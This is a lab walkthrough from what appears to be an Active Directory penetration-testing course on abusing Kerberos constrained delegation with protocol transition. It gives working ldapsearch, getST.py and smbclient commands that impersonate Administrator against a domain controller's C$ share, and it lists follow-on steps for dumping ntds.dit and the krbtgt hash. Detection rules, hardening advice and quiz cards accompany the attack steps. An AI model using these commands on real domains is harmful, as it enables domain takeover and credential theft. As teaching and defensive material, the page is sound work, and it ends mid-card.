+<h2 id="background-three-kinds-of-delegation">Background: Three Kinds of Delegation</h2>
+<p>Kerberos in AD supports three delegation models. Knowing which is which is half of the attack:</p>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>AD attribute set</th>
+<th>What it allows</th>
+<th>Detection signal</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Unconstrained</strong></td>
+<td><code>userAccountControl: TRUSTED_FOR_DELEGATION</code> (524288)</td>
+<td>Account receives a forwardable TGT for any user who authenticates to it; can act as any of them anywhere</td>
+<td>Any account with this UAC bit; high signal</td>
+</tr>
+<tr>
+<td><strong>Constrained (no protocol transition)</strong></td>
+<td><code>msDS-AllowedToDelegateTo</code> populated, no T2A4D</td>
+<td>Account uses S4U2proxy with an existing user TGT; cannot self-initiate</td>
+<td>Hard to abuse without an existing forwarded TGT</td>
+</tr>
+<tr>
+<td><strong>Constrained (with protocol transition)</strong></td>
+<td><code>msDS-AllowedToDelegateTo</code> populated, <code>userAccountControl: TRUSTED_TO_AUTH_FOR_DELEGATION</code> (16777216)</td>
+<td>Account uses S4U2self to obtain a TGS for any user without their TGT, then S4U2proxy to the allowed service</td>
+<td>The classic abuse target</td>
+</tr>
+<tr>
+<td><strong>Resource-Based (RBCD)</strong></td>
+<td><code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on the target computer</td>
+<td>Reverses the trust direction: target says "I trust source to delegate"</td>
+<td>Covered in exercise 4.5</td>
+</tr>
+</tbody>
+</table>
+<p>The "with protocol transition" variant is what this exercise targets. The flag combination <code>msDS-AllowedToDelegateTo</code> + <code>T2A4D</code> lets the holder unilaterally impersonate any user to the allowed services; no user TGT required.</p>
+<h3 id="the-s4u2self-s4u2proxy-flow">The S4U2self / S4U2proxy flow</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>svc_deleg          KDC                                       Target service (cifs/corp-dc01)
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>   |                |                                                       |
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>   |  1. Authenticate normally, get a TGT                                   |
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>   |---------------&gt;|                                                       |
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>   |&lt;---------------|                                                       |
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>   |                |                                                       |
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>   |  2. S4U2self: &quot;I want a service ticket to MYSELF as Administrator&quot;     |
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>   |     (uses T2A4D to bypass the requirement that Administrator presents  |
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>   |      a TGT)                                                            |
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>   |---------------&gt;|                                                       |
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>   |&lt;---------------|  TGS for svc_deleg-as-Administrator                   |
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>   |                |                                                       |
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>   |  3. S4U2proxy: &quot;Using this TGS as Administrator, give me a TGS to      |
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>   |     cifs/corp-dc01&quot;                                                    |
+<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>   |---------------&gt;|                                                       |
+<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>   |&lt;---------------|  TGS for cifs/corp-dc01-as-Administrator              |
+<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>   |                                                                        |
+<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>   |  4. Connect with the TGS                                               |
+<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>   |----------------------------------------------------------&gt;             |
+</code></pre></div>
+<p>The KDC validates that the target service (<code>cifs/corp-dc01</code>) is in <code>svc_deleg</code>'s <code>msDS-AllowedToDelegateTo</code> list. If yes, it issues. The target service receives a normal TGS for Administrator and serves the request as Administrator. From the service's perspective the call is from Administrator; there is no protocol-level signal that delegation occurred.</p>
+<h3 id="why-cifs-on-a-dc-is-the-worst-case-target">Why CIFS on a DC is the worst-case target</h3>
+<p>Reading <code>\\corp-dc01\C$</code> as Administrator gives you the entire NT directory of the DC. From there:
+- Pull <code>ntds.dit</code> (offline, copy + ESEDB extract)
+- Read the registry hives for SYSTEM, SAM, SECURITY (LSA secrets, machine account, cached credentials)
+- Pull the SAM hashes, krbtgt hash via secretsdump on the dumped files
+- Effectively own the domain</p>
+<p>So <code>msDS-AllowedToDelegateTo</code> containing any DC service (especially <code>cifs</code>, <code>host</code>, <code>ldap</code>, <code>rpcss</code>) is a Tier-0 escalation path. Defenders should never delegate any service to any DC unless absolutely required.</p>
+<hr />
+<h2 id="tool-primer">Tool Primer</h2>
+<h3 id="ldap-enumeration-of-constrained-delegation">LDAP enumeration of constrained delegation</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-LLL<span class="w"> </span>-H<span class="w"> </span>ldap://corp-dc01<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">  </span>-D<span class="w"> </span><span class="s2">&quot;CORP\j.chen&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;Welcome2026#&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">  </span>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=nordport,DC=local&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">  </span><span class="s2">&quot;(msDS-AllowedToDelegateTo=*)&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">  </span>sAMAccountName<span class="w"> </span>msDS-AllowedToDelegateTo<span class="w"> </span>userAccountControl
+</code></pre></div>
+<p>Filter for accounts with T2A4D too:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>(&amp;(msDS-AllowedToDelegateTo=*)(userAccountControl:1.2.840.113556.1.4.803:=16777216))
+</code></pre></div>
+<p><code>16777216</code> is <code>0x1000000</code>, the T2A4D bit.</p>
+<h3 id="getstpy-for-s4u2self-s4u2proxy">getST.py for S4U2self + S4U2proxy</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>getST.py<span class="w"> </span>corp.nordport.local/svc_deleg_&lt;token&gt;:<span class="s1">&#39;&lt;password&gt;&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">  </span>-spn<span class="w"> </span><span class="s1">&#39;cifs/corp-dc01.corp.nordport.local&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">  </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">  </span>-dc-ip<span class="w"> </span>&lt;dc_ip&gt;
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>realm/user:password</code></td>
+<td>source authentication</td>
+</tr>
+<tr>
+<td><code>-spn</code></td>
+<td>target service principal name</td>
+</tr>
+<tr>
+<td><code>-impersonate &lt;user&gt;</code></td>
+<td>the user to impersonate (S4U2self target)</td>
+</tr>
+<tr>
+<td><code>-dc-ip</code></td>
+<td>DC for the AS exchange</td>
+</tr>
+</tbody>
+</table>
+<p>The output is a <code>.ccache</code> file named after the impersonated user.</p>
+<h3 id="using-the-resulting-ticket">Using the resulting ticket</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>smbclient<span class="w"> </span>//corp-dc01.corp.nordport.local/C$<span class="w"> </span>-k<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;ls&quot;</span>
+</code></pre></div>
+<p><code>-k</code> tells smbclient to use the cached Kerberos ticket; the ccache contains the TGS for Administrator-to-cifs/corp-dc01.</p>
+<hr />
+<h2 id="walkthrough">Walkthrough</h2>
+<h3 id="step-1-find-constrained-delegation-with-t2a4d-accounts">Step 1: Find Constrained-Delegation-with-T2A4D Accounts</h3>
+<p>The discovery query combines two filters: accounts that have ANY entry in <code>msDS-AllowedToDelegateTo</code> (i.e., are configured for some constrained delegation) AND accounts with the T2A4D bit set in <code>userAccountControl</code>. Either alone yields a noisier result; the AND zeros in on the directly abusable accounts.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Enumerate</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-LLL<span class="w"> </span>-H<span class="w"> </span>ldap://corp-dc01<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">  </span>-D<span class="w"> </span><span class="s2">&quot;CORP\j.chen&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;Welcome2026#&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">  </span>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=nordport,DC=local&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">  </span><span class="s2">&quot;(&amp;(msDS-AllowedToDelegateTo=*)(userAccountControl:1.2.840.113556.1.4.803:=16777216))&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="w">  </span>sAMAccountName<span class="w"> </span>msDS-AllowedToDelegateTo
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Token</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>(msDS-AllowedToDelegateTo=*)</code></td>
+<td>Has any value (account configured for constrained delegation).</td>
+</tr>
+<tr>
+<td><code>userAccountControl:1.2.840.113556.1.4.803:=16777216</code></td>
+<td>Bitwise AND against UAC for T2A4D (<code>0x1000000</code>).</td>
+</tr>
+<tr>
+<td><code>sAMAccountName msDS-AllowedToDelegateTo</code></td>
+<td>Return only these two attributes.</td>
+</tr>
+</tbody>
+</table>
+<p>Confirm <code>svc_deleg_&lt;token&gt;</code> shows up with <code>cifs/corp-dc01...</code> in its allowed-to list. Other students' accounts also appear; that is expected.</p>
+</div>
+<h3 id="step-2-obtain-the-source-credential">Step 2: Obtain the Source Credential</h3>
+<p>For the lab, the seeded password is in the lab dashboard or visible in the per-token flag JSON the orchestrator wrote. In a real engagement you would have recovered it via Kerberoast (Exercise 3.3), a leaked SYSVOL script (Exercise 2.2), or any other credential-recovery path.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>SAM:  svc_deleg_&lt;token&gt;
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>Pwd:  (per-token, see dashboard)
+</code></pre></div>
+<h3 id="step-3-run-s4u2self-s4u2proxy">Step 3: Run S4U2self + S4U2proxy</h3>
+<p><code>getST.py</code> performs both S4U exchanges in one call. Step 1 (S4U2self) requests a TGS from the KDC where <code>svc_deleg</code> impersonates <code>Administrator</code> to itself; T2A4D allows the request without Administrator presenting a TGT. Step 2 (S4U2proxy) uses that TGS as proof to request a TGS for the configured target service. The KDC validates the SPN against <code>msDS-AllowedToDelegateTo</code> and issues if it matches.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Get Administrator's TGS via getST.py</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nb">cd</span><span class="w"> </span>~/work<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>mkdir<span class="w"> </span>-p<span class="w"> </span>adpt-4-04<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>adpt-4-04
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>getST.py<span class="w"> </span><span class="s2">&quot;corp.nordport.local/svc_deleg_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">:&lt;password&gt;&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="w">  </span>-spn<span class="w"> </span><span class="s1">&#39;cifs/corp-dc01.corp.nordport.local&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="w">  </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="w">  </span>-dc-ip<span class="w"> </span>&lt;dc_ip&gt;
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>&lt;realm&gt;/&lt;user&gt;:&lt;pw&gt;</code></td>
+<td>Source authentication string.</td>
+</tr>
+<tr>
+<td><code>-spn '&lt;svc&gt;/&lt;host&gt;.&lt;realm&gt;'</code></td>
+<td>Target SPN; must match an entry in source's <code>msDS-AllowedToDelegateTo</code>.</td>
+</tr>
+<tr>
+<td><code>-impersonate &lt;user&gt;</code></td>
+<td>The user whose identity will appear on the resulting ticket.</td>
+</tr>
+<tr>
+<td><code>-dc-ip &lt;ip&gt;</code></td>
+<td>KDC IP (skip DNS).</td>
+</tr>
+</tbody>
+</table>
+<p>A file named <code>Administrator.ccache</code> is written to the current directory. The script prints the impersonated principal and the TGS lifetime. If you see <code>KDC_ERR_BADOPTION</code> it usually means the SPN does not match the allowed-to list verbatim; check trailing instance/port and case.</p>
+</div>
+<h3 id="step-4-use-the-ticket">Step 4: Use the Ticket</h3>
+<p>The ccache contains a TGS for <code>cifs/corp-dc01</code> issued in Administrator's name. Setting <code>KRB5CCNAME</code> points GSS-API libraries at that file. <code>smbclient -k</code> uses cached Kerberos credentials instead of NTLM/password auth. The DC's CIFS service receives an AP-REQ wrapping a normal-looking TGS for Administrator and serves the request as Administrator.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Mount C$ as Administrator</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>klist
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>smbclient<span class="w"> </span>//corp-dc01.corp.nordport.local/C$<span class="w"> </span>-k<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;ls flag_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">.txt; get flag_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">.txt&quot;</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>cat<span class="w"> </span>flag_<span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span>.txt
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Token</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>KRB5CCNAME=&lt;file&gt;</code></td>
+<td>Tell GSS-API to use this credential cache.</td>
+</tr>
+<tr>
+<td><code>klist</code></td>
+<td>Display the principal and SPNs in the cache; verifies the right ticket is loaded.</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>Authenticate using cached Kerberos credentials.</td>
+</tr>
+<tr>
+<td><code>corp-dc01.corp.nordport.local</code></td>
+<td>FQDN required; the SPN's host portion must match the connected hostname exactly.</td>
+</tr>
+</tbody>
+</table>
+<p>The flag file is owned by Administrator; you read it because the SMB session authenticates as Administrator courtesy of the forged TGS.</p>
+</div>
+<h3 id="step-5-submit">Step 5: Submit</h3>
+<p>Submit the OCR{...} value on the platform.</p>
+<div class="admonition warning">
+<p class="admonition-title">Common gotchas</p>
+<ul>
+<li><strong>Hostname vs FQDN mismatch</strong>: SMB Kerberos uses the SPN derived from the connect string. <code>//corp-dc01/C$</code> produces SPN <code>cifs/corp-dc01</code>; <code>//corp-dc01.corp.nordport.local/C$</code> produces <code>cifs/corp-dc01.corp.nordport.local</code>. The <code>-spn</code> you used in Step 3 must match the SMB connect string format.</li>
+<li><strong>KDC_ERR_BADOPTION on S4U2proxy</strong>: usually means the requested SPN is not in the source's <code>msDS-AllowedToDelegateTo</code>. Re-check spelling, port suffix, and trailing whitespace.</li>
+<li><strong>Clock skew</strong>: Kerberos rejects timestamps more than 5 minutes off. Sync Kali to the DC: <code>sudo ntpdate &lt;dc_ip&gt;</code> or <code>sudo chronyc -a 'burst 4/4'</code>.</li>
+<li><strong>Cache pollution</strong>: previous Kerberos sessions may have cached a TGS for the same SPN under a different principal. <code>kdestroy</code> clears the cache before setting <code>KRB5CCNAME</code> to the new ccache.</li>
+<li><strong>NOT_DELEGATED on the impersonated user</strong>: if Administrator has the <code>Account is sensitive and cannot be delegated</code> flag (UAC bit 0x100000), S4U2self fails. Pick a different impersonation target.</li>
+</ul>
+</div>
+<hr />
+<h2 id="blue-team-perspective">Blue Team Perspective</h2>
+<p>The KDC events around S4U2self and S4U2proxy are distinct enough that a SOC with the right rule catches the attack within seconds.</p>
+<table>
+<thead>
+<tr>
+<th>Activity</th>
+<th>Event ID</th>
+<th>Field giveaway</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>S4U2self request</td>
+<td>4769</td>
+<td><code>Service Name = svc_deleg</code>, requester = self</td>
+</tr>
+<tr>
+<td>S4U2proxy issued</td>
+<td>4769</td>
+<td><code>Service Name = cifs/dc01</code>, ticket-options include <code>cname-in-pa-data</code></td>
+</tr>
+<tr>
+<td>Auth as impersonated user</td>
+<td>4624 logon type 3</td>
+<td>Target host event log</td>
+</tr>
+<tr>
+<td>MDI delegation alert</td>
+<td>"Suspected identity theft (pass-the-ticket)"</td>
+<td>Defender for Identity</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition info">
+<p class="admonition-title">The KDC giveaway</p>
+<p>Two consecutive 4769 events from the same source within milliseconds, where the first has <code>Service Name</code> matching the source's own SAM and the second has a different SPN, is the canonical S4U signature. Defender for Identity ships a built-in detection. Custom SIEM rule: alert when 4769 ServiceName matches sourceSamAccountName followed within 5 seconds by 4769 to a different SPN from the same source.</p>
+</div>
+<h2 id="hardening-note">Hardening Note</h2>
+<p>The vulnerability lives in two attributes on the source account. Audit both, restrict who can set either, and never delegate to a DC service.</p>
+<div class="admonition tip">
+<p class="admonition-title">Constrained delegation hardening</p>
+<ul>
+<li>LDAP audit weekly: <code>(&amp;(msDS-AllowedToDelegateTo=*)(userAccountControl:1.2.840.113556.1.4.803:=16777216))</code>. Treat any DC-targeted entry as critical.</li>
+<li>Empty <code>Account Operators</code> group; the <code>SeEnableDelegationPrivilege</code> granted to its members is dangerous.</li>
+<li>Move delegating service accounts to <strong>gMSAs</strong> so the source credential is uncrackable.</li>
+<li>Mark privileged accounts (Tier 0) as <code>Account is sensitive and cannot be delegated</code> (<code>NOT_DELEGATED</code> UAC bit <code>0x100000</code>).</li>
+<li>Build SIEM rule on consecutive 4769 events as described above.</li>
+<li>Replace constrained delegation with <strong>RBCD</strong> for any new service deployment; RBCD is configured on the target rather than the source, which is easier to audit.</li>
+</ul>
+</div>
+<hr />
+<h3 id="record-your-findings">Record Your Findings</h3>
+<blockquote>
+<p><strong>Vulnerable account:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>svc_deleg_&lt;token&gt;
+</code></pre></div>
+<p><strong>Allowed-to-delegate-to:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>cifs/corp-dc01.corp.nordport.local
+</code></pre></div>
+<p><strong>Impersonated principal:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>Administrator
+</code></pre></div>
+<p><strong>Flag:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>(OCR{deleg_...})
+</code></pre></div>
+</blockquote>
+<hr />
+<h2 id="analysis-questions">Analysis Questions</h2>
+<p><strong>1. The exercise depends on <code>T2A4D</code> being set in addition to <code>msDS-AllowedToDelegateTo</code>. What changes for the attacker if T2A4D is NOT set?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>Without T2A4D, the account is configured for constrained delegation <strong>without protocol transition</strong>. S4U2self is unavailable (the bit explicitly enables it). To exercise constrained delegation in this mode, the attacker needs an actual forwardable TGT from the user they want to impersonate. That requires either: (a) capturing a forwardable TGT from somewhere, (b) waiting for the user to authenticate to a service the attacker controls, (c) coercing the user to authenticate (PetitPotam, PrinterBug). In practice, "constrained delegation without T2A4D" is much less useful as a foothold; the attack chain has to first acquire a target user's TGT through a separate mechanism. With T2A4D, no preliminaries are required: source credential alone yields impersonation.</p>
+</details>
+<p><strong>2. The KDC enforces the <code>msDS-AllowedToDelegateTo</code> list when issuing the S4U2proxy TGS. What stops an attacker from editing their own account's <code>msDS-AllowedToDelegateTo</code>?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>Editing <code>msDS-AllowedToDelegateTo</code> requires the <code>SeEnableDelegationPrivilege</code> user right, which is granted only to <code>Domain Admins</code> and <code>Account Operators</code> by default. A regular domain user cannot add SPNs to the list. However, <code>Account Operators</code> is a built-in group whose membership is sometimes wider than people realize, and <code>GenericWrite</code> on a target account does NOT grant the right to add to <code>msDS-AllowedToDelegateTo</code> (the schema-level enforcement uses <code>SeEnableDelegationPrivilege</code>, not the standard ACL). If an attacker has Domain Admin or Account Operators they have already won; the constraint exists primarily to limit how an attacker with mid-tier rights can elevate. The realistic abuse scenario is: find an account that is already configured for delegation by a sloppy admin, then leverage it; do not try to configure delegation as a non-Tier-0 attacker.</p>
+</details>
+<p><strong>3. From a defender's perspective, what query enumerates the highest-risk constrained delegation paths?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>The query is "any account with msDS-AllowedToDelegateTo containing a service on a Domain Controller, especially <code>cifs/</code>, <code>host/</code>, <code>ldap/</code>, <code>rpcss/</code>, or <code>time/</code>." LDAP filter:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>(&amp;(msDS-AllowedToDelegateTo=cifs/corp-dc01*)
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>  (msDS-AllowedToDelegateTo=cifs/corp-dc02*))
+</code></pre></div>
+<p>Or any wildcard match against DC hostnames. Each result is a Tier-0 escalation path. The mitigation is to remove the entry; if the delegation is needed (rare for DCs), restrict <code>T2A4D</code> to break the protocol-transition convenience and force the attacker to capture an actual forwardable TGT. For a comprehensive view, BloodHound's <code>AllowedToDelegate</code> edges show the same data graphically.</p>
+</details>
+<hr />
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ul>
+<li>Constrained delegation + T2A4D = unilateral impersonation of any user to the allowed service.</li>
+<li><code>getST.py -impersonate &lt;user&gt; -spn &lt;target&gt;</code> performs S4U2self then S4U2proxy.</li>
+<li>A delegation entry pointing at any DC service is a Tier-0 escalation path.</li>
+<li>The KDC enforces the SPN list; only Domain Admins / Account Operators can edit it.</li>
+<li>BloodHound <code>AllowedToDelegate</code> edges show the graph of every delegation in the domain.</li>
+</ul>
+<h2 id="cheat-sheet-recap">Cheat Sheet Recap</h2>
+<p>The four operations below cover discovery and exploitation. Run them in this order on every constrained delegation finding.</p>
+<table>
+<thead>
+<tr>
+<th>Goal</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Find constrained-PT accounts</td>
+<td><code>ldapsearch -x -LLL -H ldap://&lt;dc&gt; -D "&lt;DOMAIN&gt;\&lt;u&gt;" -w '&lt;pw&gt;' -b "&lt;DN&gt;" "(&amp;(msDS-AllowedToDelegateTo=*)(userAccountControl:1.2.840.113556.1.4.803:=16777216))" sAMAccountName msDS-AllowedToDelegateTo</code></td>
+</tr>
+<tr>
+<td>Run S4U2self + S4U2proxy</td>
+<td><code>getST.py "&lt;domain&gt;/&lt;svc&gt;:&lt;pw&gt;" -spn '&lt;service&gt;/&lt;host&gt;.&lt;domain&gt;' -impersonate Administrator -dc-ip &lt;dc&gt;</code></td>
+</tr>
+<tr>
+<td>Use the ticket</td>
+<td><code>export KRB5CCNAME=Administrator.ccache &amp;&amp; smbclient //&lt;host&gt;/&lt;share&gt; -k -c "ls"</code></td>
+</tr>
+<tr>
+<td>Verify impersonation</td>
+<td><code>klist</code> (target principal should be <code>Administrator@&lt;REALM&gt;</code>)</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="spaced-repetition">Spaced Repetition</h2>
+<p><strong>Card 1: getST.py Invocation</strong></p>
+<p>Q: Write the getST.py command to obtain a TGS impersonating Administrator for <code>cifs/dc01.corp.local</code> using source <code>svc_app:Pass#</code> against <code>corp.local</code>.</p>
+<details class="note">
+<summary>Answer</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>getST.py<span class="w"> </span><span class="s2">&quot;corp.local/svc_app:Pass#&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="w">  </span>-spn<span class="w"> </span><span class="s1">&#39;cifs/dc01.corp.local&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="w">  </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="w">  </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.10.10
+</code></pre></div>
+<p>Output: <code>Administrator.ccache</code>. Use with <code>KRB5CCNAME=Administrator.ccache</code> and any <code>-k</code> Kerberos-aware tool.</p>
+</details>
+<p><strong>Card 2: T2A4D Flag Bit</strong></p>
+<p>Q: What is the userAccountControl bit value for <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>, and why does it matter?</p>
+<details class="note">
+<summary>Answer</summary>
+<p><code>0x1000000</code> = decimal 16777216. Setting it on an account enables S4U2self, which lets the account obtain a service ticket for any user without that user presenting a TGT. Combined with <code>msDS-AllowedToDelegateTo</code>, it allows unilateral impersonation. Find such accounts via <code>(userAccountControl:1.2.840.113556.1.4.803:=16777216)</code>. T2A4D = "Trust this user for delegation to specified services only, <strong>and use any authentication protocol</strong>" (the protocol transition piece).</p>
+</details>
+<p><strong>Card 3: Three Delegation Types</strong></p>
+<p>Q: Distinguish unconstrained, constrained-without-protocol-transition, and constrained-with-protocol-transition delegation.</p>
+<details class="note">
+<summary>Answer</summary>
+<p>Unconstrained: <code>TRUSTED_FOR_DELEGATION</code> UAC bit; account receives forwardable TGTs for any user authenticating to it; can act anywhere as any of them. Constrained without PT: <code>msDS-AllowedToDelegateTo</code> populated; no T2A4D; needs an existing forwardable TGT to use S4U2proxy. Constrained with PT: <code>msDS-AllowedToDelegateTo</code> + T2A4D; uses S4U2self to bootstrap, then S4U2proxy; unilateral. The third is the classic abuse target.</p>
+</details>
+<p><strong>Card 4: Why DC CIFS Is Worst-Case</strong></p>
+<p>Q: Why is delegation to <code>cifs/dc01</code> essentially Domain Admin?</p>
+<details class="note">
+<summary>Answer</summary>
